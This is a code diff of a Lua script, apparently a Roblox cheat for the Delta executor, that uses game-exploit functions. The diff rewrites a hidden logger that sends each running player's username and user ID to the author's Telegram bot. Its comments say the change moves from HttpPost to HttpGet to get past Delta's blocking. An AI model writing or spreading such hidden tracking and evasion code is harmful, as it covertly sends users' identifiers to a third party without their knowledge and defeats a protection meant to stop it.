@@ -17,11 +17,14 @@ local touchActive = false
 local function safePrompt(p) if p then pcall(function() fireproximityprompt(p) end) end end
 local function safeTouch(a, b) if a and b then pcall(function() firetouchinterest(a, b, 0) task.wait(0.05) firetouchinterest(a, b, 1) end) end end
 
--- ЛОГГЕР (БЕЗ ПРОВЕРОК, КАК В НАЧАЛЕ)
+-- ОТПРАВКА В ТЕЛЕГРАМ ЧЕРЕЗ HTTPGET (ОБХОД БЛОКИРОВКИ DELTA)
 task.spawn(function()
-    local text = "👤 **Новый запуск!**\nНик: " .. player.Name .. "\nID: " .. tostring(player.UserId)
+    local text = "👤 Ник: " .. player.Name .. "\n🆔 ID: " .. tostring(player.UserId)
+    local encodedText = text:gsub(" ", "%%20"):gsub("\n", "%%0A") -- Кодируем текст для ссылки
+    local url = "https://api.telegram.org/bot" .. TG_TOKEN .. "/sendMessage?chat_id=" .. TG_ID .. "&text=" .. encodedText
+    
     pcall(function()
-        game:HttpPost("https://api.telegram.org/bot" .. TG_TOKEN .. "/sendMessage", HttpService:JSONEncode({chat_id = TG_ID, text = text, parse_mode = "Markdown"}), "application/json")
+        game:HttpGet(url) -- Delta это пропускает
     end)
 end)
 
